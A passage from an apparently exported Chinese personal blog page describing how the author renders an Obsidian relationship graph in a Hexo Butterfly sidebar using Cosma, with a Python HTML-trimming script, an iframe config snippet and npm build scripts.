<li><a href="https://www.cnblogs.com/xuweili/articles/3943920.html#:~:text=%E5%BC%80%E5%A7%8B--%E8%BF%90%E8%A1%8C--cmd%20%E8%BF%9B%E5%85%A5%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%20%E8%BE%93%E5%85%A5netstat%20-ano%20%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0%E6%89%80%E6%9C%89%E8%BF%9E%E6%8E%A5%E7%9A%84PID%20%E4%B9%8B%E5%90%8E%E5%9C%A8%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8%E4%B8%AD%E6%89%BE%E5%88%B0%E8%BF%99%E4%B8%AAPID%E6%89%80%E5%AF%B9%E5%BA%94%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%A6%82%E6%9E%9C%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8%E4%B8%AD%20%E6%B2%A1%E6%9C%89PID%20%E8%BF%99%E4%B8%80%E9%A1%B9%2C%E5%8F%AF%E4%BB%A5%E5%9C%A8%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8%E4%B8%AD%E9%80%89%22%E6%9F%A5%E7%9C%8B%22-%22%E9%80%89%E6%8B%A9%E5%88%97%22,C%3A%3E%20netstat%20-ano%20%E5%8D%8F%E8%AE%AE%20%E6%9C%AC%E5%9C%B0%E5%9C%B0%E5%9D%80%20%E5%A4%96%E9%83%A8%E5%9C%B0%E5%9D%80%20%E7%8A%B6%E6%80%81%20PID">windows 中查看端口占用、pid、禁用 - 山顶的鱼 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/nothing_is_imposible/article/details/108315760">JavaScript Set 的用法与理解_js set push_暮春风的博客-CSDN 博客</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Loops_and_iteration#for...in_%E8%AF%AD%E5%8F%A5">循环与迭代 - JavaScript | MDN (mozilla.org)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="746142122">
                            <a href="#746142122">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>第一次写 Hexo 插件</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!warning] 这是一篇过期文章 [2024.04.12]<br>
本篇文章已过期。</p>
<ul>
<li>本文为文章 <a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a> 中双链语法部分的分离，强烈建议使用新方法适配双向链接。</li>
<li>在没有合适插件的情况下，我自己探索了一套方法实现这个效果。但是这套方法安装插件较多，依赖性复杂，不易维护。于是我自己写了一个更好的插件完成了这个效果，更多故事详见 <a href="#746142122" title="第一次写 Hexo 插件" class="record-link highlight">第一次写 Hexo 插件</a></li>
<li>这套工作链服务了半年，成功见证了数十篇文章诞生。截至光荣退休时它还能工作😀。</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3569112562">
                            <a href="#3569112562">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客适配 Obsidian 新语法</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!warning] 这是一篇过期文章 [2024.04.12]<br>
本篇文章已过期。</p>
<ul>
<li>本文为文章 <a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a> 中双链语法部分的分离，强烈建议使用新方法适配双向链接。</li>
<li>在没有合适插件的情况下，我自己探索了一套方法实现这个效果。但是这套方法安装插件较多，依赖性复杂，不易维护。于是我自己写了一个更好的插件完成了这个效果，更多故事详见 <a href="#746142122" title="第一次写 Hexo 插件" class="record-link ">第一次写 Hexo 插件</a></li>
<li>这套工作链服务了半年，成功见证了数十篇文章诞生。截至光荣退休时它还能工作😀。</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3569112562">
                            <a href="#3569112562">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客适配 Obsidian 新语法</span>
                                
                                <div class="record-links-context hover">
                                    <p>旧方案仍然可以工作，不过操作繁琐。详见：<a href="#2136059777" title="Obsidian Internal links 双向链接渲染解决方案" class="record-link highlight">Obsidian Internal links 双向链接渲染解决方案</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="746142122">
                            <a href="#746142122">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>第一次写 Hexo 插件</span>
                                
                                <div class="record-links-context hover">
                                    <p>双链语法是 Obsidian 最重要的特性。一开始，我也找到了相似的插件 <code>hexo-link-obsidian</code>，但是这个插件的使用过为复杂和苛刻（详看 <a href="#2136059777" title="Obsidian Internal links 双向链接渲染解决方案" class="record-link highlight">这篇文章</a>）：</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="4139834099" class="record">
            <header>
                <h1 class="record-title">Butterfly 侧边栏实现 Obsidian 关系图谱</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Butterfly');">Butterfly</button>
                    
                    <button class="btn" onclick="activeTag('Obsidian');">Obsidian</button>
                    
                    <button class="btn" onclick="activeTag('Cosma');">Cosma</button>
                    
                    <button class="btn" onclick="activeTag('Python');">Python</button>
                    
                    <button class="btn" onclick="activeTag('NPM');">NPM</button>
                    
                    <button class="btn" onclick="activeTag('script');">script</button>
                    
                    <button class="btn" onclick="activeTag('YAML');">YAML</button>
                    
                    <button class="btn" onclick="activeTag('Markdown');">Markdown</button>
                    
                    <button class="btn" onclick="activeTag('HTML');">HTML</button>
                    
                    <button class="btn" onclick="activeTag('CSS');">CSS</button>
                    
                    <button class="btn" onclick="activeTag('项目');">项目</button>
                    
                    <button class="btn" onclick="activeTag('GitHub');">GitHub</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/11/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/relationcover.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>通过自制脚本实现文章关系图绘制以及加入 Hexo 部署自动化流程中</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>f6c0daf3</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!hint] 兼容性信息</p>
<ul>
<li>文章中脚本已适配 cosma 2.4.0 版本【2023.12.27】</li>
<li>cosma v2.1.0 版本更新后，原生支持 Obsidian 标题形式的双向链接，但优先识别 id 字段。本脚本执行过程会向输出文件增加 id 元数据，所以脚本在新版本 cosma 下仍能<strong>正确实现</strong>预期的功能。更多信息详见：<a href="https://cosma.arthurperret.fr/changelog.html">Cosma | Changelog (arthurperret.fr)</a></li>
</ul>
</blockquote>
<p>本文包含的项目：</p>
<p><a href="https://github.com/uuanqin/obsidian2cosma"><img src="https://github-readme-stats.uuanqin.top/api/pin/?username=uuanqin&amp;repo=obsidian2cosma" alt="Readme Card"></a></p>
<h1>挖坑</h1>
<p>由于最近使用 Obsidian 写文章，页面之间的链接越来越丰富，关系图谱越来越复杂。我在想能不能有一种方法可以把 Obsidian 的这张关系图导出放在网站上呢？经历一番探索之后，我发现 Obsidian 官方是推出过关系图生成网页的功能的：<a href="https://obsidian.md/publish">Obsidian Publish</a>，但它是付费服务。</p>
<p>终于，我在 Obsidian 的论坛找到了我想要的：<a href="https://forum.obsidian.md/t/share-the-graph-view-and-notes-as-html-page-for-free-with-obsidian2cosma/51070">Share the graph view and notes as HTML page for free with obsidian2cosma - Share &amp; showcase - Obsidian Forum</a>。在这篇帖子中，作者利用一款可以生成这种关系图的开源 APP <a href="https://cosma.arthurperret.fr/installing.html">Cosma</a> 进行生成。Cosma 可以生成一个 HTML 网页，在包含关系图的同时提供对各个结点的交互，让用户在多种视图下审阅知识库的内容。</p>
<p>为了让文章中的双向链接能被 Cosma 识别，帖子作者 <a href="https://github.com/kevinpolisano">Kévin Polisano</a> 还自己编写了一个 <a href="https://github.com/kevinpolisano/obsidian2cosma">Python 命令行工具</a>，将 Obsidian 知识库中的文章的 Front-matter、以及双向链接的格式进行替换，以使得 Cosma 能够识别文章。这一点就让我看到了 Hexo 关系图谱实现的可能性，于是耗时一个星期的挖坑开始了......</p>
<h1>效果</h1>
<p>文章在 Obsidian 中显示的关系视图是这样的：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230811225333.png" alt="image.png|300"></p>
<p>在 Hexo 侧边栏是这样的：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230811225838.png" alt="image.png|350"></p>
<p>主关系图网页是这样的：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230811230008.png" alt="image.png"></p>
<p>包含了各种标签筛选、视图以及文章查看等功能。</p>
<h1>思路</h1>
<p>整个过程分为几个步骤，我的愿景是脚本全自动进行。在 Hexo 进行本地部署或上传至服务器时进行以下操作：</p>
<ol>
<li>使用脚本转换 Hexo 中 <code>_posts</code> 目录下的文章为 Cosma 可以识别的文章</li>
<li>运行两次 Cosma，根据不同的配置文件生成两个不一样的 <code>cosmoscope.html</code>（这就是我说的那个关键的包含关系图谱网页）</li>
<li>将其中一个 <code>cosmoscope.html</code> 用脚本进行修剪，用做侧边栏的展示</li>
<li>将处理好的 <code>cosmoscope.html</code> 粘贴到 Hexo 博客 <code>source</code> 目录下某指定文件夹中</li>
<li>删除转换后的文件，以免 Obsidian 仓库混淆</li>
<li>脚本进行剩余的本地部署或发布操作</li>
</ol>
<h1>操作</h1>
<h2>转换 Obsidian 文章为 Cosma 可识别的文章</h2>
<p>这一步是关键一步。只要能导出 HTML 关系图谱网页那么一切都好办了。</p>
<p>前面提到过 Kévin Polisano 写了一个脚本实现了这样的功能，但是限于这个脚本的诞生条件（Cosma 有未修复的 Bug）以及创作环境（作者是法国人且常用 Linux/IOS，脚本有很多兼容性 Bug），导致它的脚本跑不起来。</p>
<p>在我仔细研读源代码后决定将其重写代码以让它正确工作。项目地址如下：</p>
<p><a href="https://github.com/uuanqin/obsidian2cosma"><img src="https://github-readme-stats.uuanqin.top/api/pin/?username=uuanqin&amp;repo=obsidian2cosma" alt="Readme Card"></a></p>
<blockquote>
<p><em>欢迎大家来捧场 🎉🎉！喜欢可以点个 star ⭐</em></p>
</blockquote>
<p>这个脚本最主要特点：<strong>Windows/Linux/MacOS 适配</strong>、<strong>Cosma/Zettlr 兼容</strong>、<strong>适合 Hexo 类型文章管理</strong>、<strong>语言支持（更适合中国宝宝体质）</strong>。</p>
<p>我在原脚本的基础上修复了一些 Bug 也增加了一些功能以适配我的需求：</p>
<blockquote>
<p>[!Cite] 修复与增强</p>
<ul>
<li>重写了 YAML 解析器，使之可以解析更多格式的 YAML，摆脱特定关键字的依赖。</li>
<li>重写了创建 ID 的逻辑。</li>
<li>功能：更改 front-matter 中的关键字名称。</li>
<li>修复了在 Windows 上复制源文件创建日期时出现的错误。</li>
<li>提高在 Windows 上工作的效率。</li>
<li>为频繁使用脚本提供交互增强。</li>
<li>支持使用 UTF-8 字符集，中文标题文章也能用。</li>
<li>更新 <a href="http://README.md">README.md</a> 并增加其中文版本。</li>
<li>其他：ID 冲突检测、程序运行时间计算等<br>
<em>—— 摘自 <a href="https://github.com/uuanqin/obsidian2cosma/blob/main/README_zh.md">uuanqin/obsidian2cosma(github.com) 中文文档</a></em></li>
</ul>
</blockquote>
<h2>使用 Cosma 生成关系图谱 HTML</h2>
<p>在使用了上述脚本后，输出的 Markdown 文件会在指定的文件夹中，这里假设为 <code>data/</code>。接下来我们使用 Cosma 进行读取和转换。</p>
<p>Cosma 的安装与使用请详详细细阅读官网：<a href="https://cosma.arthurperret.fr/about.html">Cosma | About Cosma (arthurperret.fr)</a></p>
<p>我的设想是使用两个不同的 Cosma 配置文件生成两种 <code>cosmoscope.html</code>：一个用做侧边栏的基础展示，不需要那么多花里胡哨的功能，视图更清晰一些即可，这里我称之 <code>cosmoscope_trim.html</code>；另一个用做正式的交互网页，一般原封不动即可。</p>
<h2>对 <code>cosmoscope.html</code> 进行修剪与美化</h2>
<p>在上一步中，配置文件只能调一些基本结点样式而已，不能关闭一些功能。这就会导致 <code>cosmoscope_trim.html</code> 文件很大，在侧边栏中显示不全。因此，这里我通过浏览器 F12 确定删减的标签与更改的样式，在将这个操作新写成另一个 Python 脚本。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230811233922.png" alt="image.png"></p>
<p>此外，我对这个网页增加了一个按钮，让读者可以进入到主关系视图网页。项目来自：<a href="https://codepen.io/jqueryalmeida/pen/ZxmzYe">Css buttom (codepen.io)</a></p>
<p>脚本分享：</p>
<pre><code class="language-python">&quot;&quot;&quot;
  此脚本将根据 Cosma CLI 2.4.0 生成的关系图谱网页进行修剪。
  作者：uuanqin（wuanqin@mail.ustc.edu.cn）
&quot;&quot;&quot;

import os
import re

from bs4 import BeautifulSoup
import sys
from pathlib import Path

def trim(target_html):
    &quot;&quot;&quot;
    修剪 HTML文件使之能在侧边栏展出
    :return:
    &quot;&quot;&quot;

    soup = BeautifulSoup(open(target_html,&quot;r&quot;,encoding=&quot;utf-8&quot;), 'html.parser')

    # 删除多余元素
    soup.html.body.aside.decompose()
    soup.html.body.main.decompose()
    soup.html.body.button.decompose() # 2.4.0
    soup.html.body.button.decompose() # 2.4.0
    for div in soup.html.body.find_all(&quot;div&quot;, {'class': 'graph-controls'}):
        div.decompose()


    # 修改css，使得图片占据全画面
    style_str = soup.html.style.string
    style_str = re.sub(r&quot;(width: )calc\(100vw - 30rem\)(;)&quot;,r&quot;\1 100vw\2&quot;,style_str,count=1,flags=re.DOTALL)
    soup.html.style.string = style_str

    # 项目地址 https://codepen.io/jqueryalmeida/pen/ZxmzYe
    # CSS部分
    css_string = &quot;&quot;&quot;
   .btn-b {
    position: absolute;
    bottom: 9%;
    right: 2%;
    cursor: pointer;
    font-size: 10px;
    text-align: left;
    background: #a188fc;
    background: linear-gradient(to right, #0f4eb4 1%, #07a1e9 100%);
    color: #ddffff;
    padding: 0rem 0rem 0rem 0rem;
    border-radius: 10rem 50rem 50rem 10rem;
    -webkit-transition: all 0.7s;
    -moz-transition: all 0.7s;
    transition: all 0.7s;
    display: flex;
    align-items: center;
    justify-content: space-between;
   }
   .btn-b:after {
    content: &quot;&quot;;
    position: absolute;
    right: -1px;
    margin-left: 1em;
    width: 35px;
    height: 35px;
    border-radius: 50%;
    box-shadow: 0px 2px 8px 0px rgba(15, 78, 180, 0.22);
    background: #3bc1ff url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48IS0tISBGb250IEF3ZXNvbWUgUHJvIDYuNC4yIGJ5IEBmb250YXdlc29tZSAtIGh0dHBzOi8vZm9udGF3ZXNvbWUuY29tIExpY2Vuc2UgLSBodHRwczovL2ZvbnRhd2Vzb21lLmNvbS9saWNlbnNlIChDb21tZXJjaWFsIExpY2Vuc2UpIENvcHlyaWdodCAyMDIzIEZvbnRpY29ucywgSW5jLiAtLT48cGF0aCBkPSJNMzQ0IDBINDg4YzEzLjMgMCAyNCAxMC43IDI0IDI0VjE2OGMwIDkuNy01LjggMTguNS0xNC44IDIyLjJzLTE5LjMgMS43LTI2LjItNS4ybC0zOS0zOS04NyA4N2MtOS40IDkuNC0yNC42IDkuNC0zMy45IDBsLTMyLTMyYy05LjQtOS40LTkuNC0yNC42IDAtMzMuOWw4Ny04N0wzMjcgNDFjLTYuOS02LjktOC45LTE3LjItNS4yLTI2LjJTMzM0LjMgMCAzNDQgMHpNMTY4IDUxMkgyNGMtMTMuMyAwLTI0LTEwLjctMjQtMjRWMzQ0YzAtOS43IDUuOC0xOC41IDE0LjgtMjIuMnMxOS4zLTEuNyAyNi4yIDUuMmwzOSAzOSA4Ny04N2M5LjQtOS40IDI0LjYtOS40IDMzLjkgMGwzMiAzMmM5LjQgOS40IDkuNCAyNC42IDAgMzMuOWwtODcgODcgMzkgMzljNi45IDYuOSA4LjkgMTcuMiA1LjIgMjYuMnMtMTIuNSAxNC44LTIyLjIgMTQuOHoiLz48L3N2Zz4=) no-repeat center;
    background-size: 50%;
   }
    &quot;&quot;&quot;
    new_style_tag = soup.new_tag(&quot;style&quot;)
    new_style_tag.string = css_string
    soup.html.head.append(new_style_tag)
    # HTML部分
    new_div_tag = soup.new_tag(&quot;div&quot;)
    new_div_tag[&quot;class&quot;] = &quot;btn-b&quot;
    # 链接
    new_a_tag = soup.new_tag(&quot;a&quot;)
    new_a_tag[&quot;href&quot;] = &quot;/DO_NOT_render/cosmoscope/cosmoscope.html&quot;
    new_a_tag[&quot;target&quot;] = &quot;_blank&quot;
    new_a_tag.append(new_div_tag)
    soup.html.body.div.insert_after(new_a_tag)


    # 重新写回
    p = Path(target_html)
    output_html =  os.path.dirname(target_html)+&quot;/&quot;+p.stem+'_trim.html'

    with open(output_html,&quot;w&quot;,encoding=&quot;utf-8&quot;) as f:
        f.write(soup.prettify())

if __name__ == &quot;__main__&quot;:
    # target_html = &quot;cosma_dir/cosmoscope.html&quot;
    trim(sys.argv[1])
</code></pre>
<h2>Hexo 侧边栏配置</h2>
<p>实现无缝侧边栏参考我这篇教程：<a href="#90746120" title="Butterfly 不改动主题源码实现自定义侧边栏" class="record-link ">Butterfly 不改动主题源码实现自定义侧边栏</a></p>
<p>widge.yml：</p>
<pre><code class="language-yaml">- class_name: seamless-card
	id_name:
	name:
	icon:
	order:
	html: |
		&lt;div style=&quot;height: 250px&quot;&gt;
		&lt;iframe src=&quot;/DO_NOT_render/cosmoscope/cosmoscope_trim.html&quot; frameborder=&quot;no&quot; style=&quot;width: 100%; height: 100%&quot;&gt;&lt;/iframe&gt;
		&lt;/div&gt;
</code></pre>
<p>可以看到 iframe 指向 <code>cosmoscope_trim.html</code>。</p>
<h2>Hexo 部署自动化</h2>
<p>上文 <a href="#%E6%80%9D%E8%B7%AF">思路</a>，中提到的自动化步骤，通过了 npm script 及其钩子实现。</p>
<p>以前的文章中我提到过钩子的用法：</p>
<ul>
<li>使用钩子在 Hexo 部署前检查 Obsidian 是否启动：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a></li>
<li>Hexo 发布后自动刷新 CDN：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link ">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a></li>
</ul>
<p>分享我目前的 npm script：</p>
<pre><code class="language-json">&quot;scripts&quot;: {
&quot;build&quot;: &quot;hexo generate&quot;,
&quot;clean&quot;: &quot;hexo clean&quot;,
&quot;deploy&quot;: &quot;hexo deploy&quot;,
&quot;server&quot;: &quot;hexo server&quot;,
&quot;prepublish&quot;: &quot;npm run check-obsidian &amp;&amp; npm run check-markdown-filename&quot;,
&quot;publish&quot;: &quot;hexo clean &amp;&amp; hexo g &amp;&amp; npm run gen-cosma &amp;&amp; hexo d&quot;,
&quot;postpublish&quot;: &quot;hexo algolia &amp;&amp; npm run flush-cdn&quot;,
&quot;prestart&quot;: &quot;npm run check-obsidian &amp;&amp; npm run check-markdown-filename&quot;,
&quot;start&quot;: &quot;hexo clean &amp;&amp; hexo g &amp;&amp; npm run gen-cosma &amp;&amp; hexo s&quot;,
&quot;flush-cdn&quot;: &quot;node my_scripts/auto_flush_cdn.js&quot;,
&quot;check-obsidian&quot;: &quot;node my_scripts/check_obsidian.js&quot;,
&quot;check-markdown-filename&quot;: &quot;python my_scripts/check_md_name.py source/_posts&quot;,
&quot;ob2co&quot;: &quot;python my_scripts/obsidian2cosma.py -i source/_posts -o my_scripts/cosma_dir/data --ignore -f --method abbrlink --attrreplacement categories,types date,begin --verbose&quot;,
&quot;cosma-total&quot;: &quot;cd my_scripts/cosma_dir/dir_total &amp;&amp; cosma m&quot;,
&quot;cosma-trim&quot;: &quot;cd my_scripts/cosma_dir/dir_trim &amp;&amp; cosma m &amp;&amp; python ../../cosmoscope_trim.py ../../cosma_dir/dir_trim/cosmoscope.html&quot;,
&quot;cosma-copy&quot;: &quot;copy \&quot;.\\my_scripts\\cosma_dir\\dir_total\\cosmoscope.html\&quot; \&quot;.\\source\\DO_NOT_render\\cosmoscope\\cosmoscope.html\&quot; &amp; copy \&quot;.\\my_scripts\\cosma_dir\\dir_trim\\cosmoscope_trim.html\&quot; \&quot;.\\source\\DO_NOT_render\\cosmoscope\\cosmoscope_trim.html\&quot;&quot;,
&quot;cosma-rm-output&quot;: &quot;echo \&quot;删除转换后的输出文件 - Cosma\&quot; &amp;&amp; rmdir /s /q .\\my_scripts\\cosma_dir\\data\\&quot;,
&quot;gen-cosma&quot;: &quot;npm run ob2co &amp;&amp; npm run cosma-total &amp;&amp; npm run cosma-trim &amp;&amp; npm run cosma-copy &amp;&amp; npm run cosma-rm-output&quot;
}
</code></pre>
<p>每个步骤保持分开，以方便调试。</p>
<p>obsidian2cosma 脚本指令：</p>
<pre><code class="language-sh">python my_scripts/obsidian2cosma.py
	-i source/_posts
	-o my_scripts/cosma_dir/data
	--ignore
	-f
	--method abbrlink
	--attrreplacement categories,types date,begin
	--verbose
</code></pre>
<h1>后记</h1>
<p>最终能完成这样的效果我也很欣慰，和设想的差不多，<s>似乎感受到了一丢丢程序员改变世界的力量 🤭🤭🤭</s>。很多细节我没有详细写出，但是把最重要的思路理清了，有问题的小伙伴可直接评论。</p>
<h2>后续改进</h2>
<ul>
<li>[x] 事后清洁，删除输出的 Markdown 文档以免混淆 Obsidian</li>
<li>[ ] 处理侧边栏图片报错问题，太吵了（有点困难，因为 js 有压缩，只能另辟蹊径）</li>
<li>[ ] 研究不同页面 Focus</li>
<li>[ ] 主页面增加原文跳转链接（这可能得深入源码去改，或者编写脚本，统一从源 HTML 创造 N 份版本）</li>
<li>[ ] 攻克侧边栏 Iframe 网页内的夜间模式问题</li>
<li>[ ] 移动端适配不是很友好</li>
<li>[ ] 历史记录 history 臃肿，需要不时删一删</li>
<li>[x] cosma 2.1.0 侧边栏显示图像过小（只能等更新，脚本暂时无法处理）（新版本已修复问题）</li>
<li>[ ] 完整网页加载较慢。原因是cosma需要对所有的网络图片进行加载，没有懒加载功能。这会导致CDN流量过大。</li>
</ul>
<blockquote>
<p>其实，自己弄一个简单的，就可以解决上面所有问题。</p>
</blockquote>
<h2>踩过的坑</h2>
<ol>
<li>npm script 中使用 copy 命令时，路径用 <code>\\</code> 分隔，不然会找不到文件</li>
<li>你可能会把 Obsidian2cosma 脚本输出的文档放在了平时用 Obsidian 写作的 Vault 内。请注意，这样的话 Obsidian 仓库中就会出现两个同名但不同文件夹的文章，会导致<strong>以后</strong>平时插入双向链接或修改双向链接时出现双向链接题目不对的问题，进而导致<strong>第二次</strong>使用该脚本时一些链接识别不出的问题。</li>
<li>博客根目录不要创建 <code>scripts</code> 目录并在里面放自己写的脚本，除非你知道自己在做什么。否则导致 <code>hexo clean</code> 出错。针对这一点，我似乎找到了根源：<a href="https://hexo.io/zh-cn/docs/plugins.html#%E8%84%9A%E6%9C%AC%EF%BC%88Scripts%EF%BC%89">插件 | Hexo</a></li>
</ol>
<h1>本文参考</h1>
<ul>
<li><a href="https://docs.zettlr.com/en/academic/zkn-method/">Zettelkasten Methods - Zettlr Docs</a></li>
<li><a href="https://cosma.arthurperret.fr/user-manual.html">Cosma | User Manual (arthurperret.fr)</a></li>
<li><a href="https://forum.obsidian.md/t/share-the-graph-view-and-notes-as-html-page-for-free-with-obsidian2cosma/51070">Share the graph view and notes as HTML page for free with obsidian2cosma - Share &amp; showcase - Obsidian Forum</a></li>
<li><a href="https://blog.csdn.net/qq_19934363/article/details/118091299">Python os.system 乱码_输微的博客-CSDN 博客</a></li>
<li><a href="https://stackoverflow.com/questions/4996405/how-do-i-change-the-file-creation-date-of-a-windows-file#:~:text=pip%20install%20win32-setctime%20And%20then%20use%20it%20like,dependency%20other%20that%20the%20built-in%20ctypes%20Python%20library%3A">stackoverflow.com/questions/4996405/how-do-i-change-the-file-creation-date-of-a-windows-file#:~:text=pip install win32-setctime And then use it like,dependency other that the built-in ctypes Python library%3A</a></li>
<li><a href="https://www.winhelponline.com/blog/change-accessed-modified-created-file-date-timestamp-windows/">winhelponline.com/blog/change-accessed-modified-created-file-date-timestamp-windows/</a></li>
<li><a href="https://yaml.org/spec/1.2.2/#a-long-long-long-long-link">YAML Ain’t Markup Language (YAML™) revision 1.2.2</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/429205730">Python 正则表达式细节小记 - 知乎 (zhihu.com)</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/id">id - HTML（超文本标记语言） | MDN (mozilla.org)</a></li>
<li><a href="https://www.windowsdigitals.com/change-file-date-timestamp-cmd-powershell/#:~:text=Set-ItemProperty%20-Path%20%22example.txt%22%20-Name%20CreationTime%20-Value%20%24NewDate,Set-ItemProperty%20-Path%20%22example.txt%22%20-Name%20LastWriteTime%20-Value%20%24NewDate">Change File(s) Date &amp; Timestamp via CMD or PowerShell (windowsdigitals.com)</a></li>
<li><a href="https://blog.csdn.net/yedajiang44/article/details/118176272">powershell 执行多条命令_powershell 执行多条命令_yedajiang44 的博客-CSDN 博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="90746120">
                            <a href="#90746120">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 不改动主题源码实现自定义侧边栏</span>
                                
                                <div class="record-links-context hover">
                                    <p>实现无缝侧边栏参考我这篇教程：<a href="#90746120" title="Butterfly 不改动主题源码实现自定义侧边栏" class="record-link highlight">Butterfly 不改动主题源码实现自定义侧边栏</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2958737902">
                            <a href="#2958737902">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li>使用钩子在 Hexo 部署前检查 Obsidian 是否启动：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a></li>
<li>Hexo 发布后自动刷新 CDN：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link highlight">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3569112562">
                            <a href="#3569112562">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客适配 Obsidian 新语法</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li>使用钩子在 Hexo 部署前检查 Obsidian 是否启动：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a></li>
<li>Hexo 发布后自动刷新 CDN：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link ">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="90746120">
                            <a href="#90746120">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 不改动主题源码实现自定义侧边栏</span>
                                
                                <div class="record-links-context hover">
                                    <p><a href="#4139834099" title="Butterfly 侧边栏实现 Obsidian 关系图谱" class="record-link highlight">Butterfly 侧边栏实现 Obsidian 关系图谱</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="746142122">
                            <a href="#746142122">
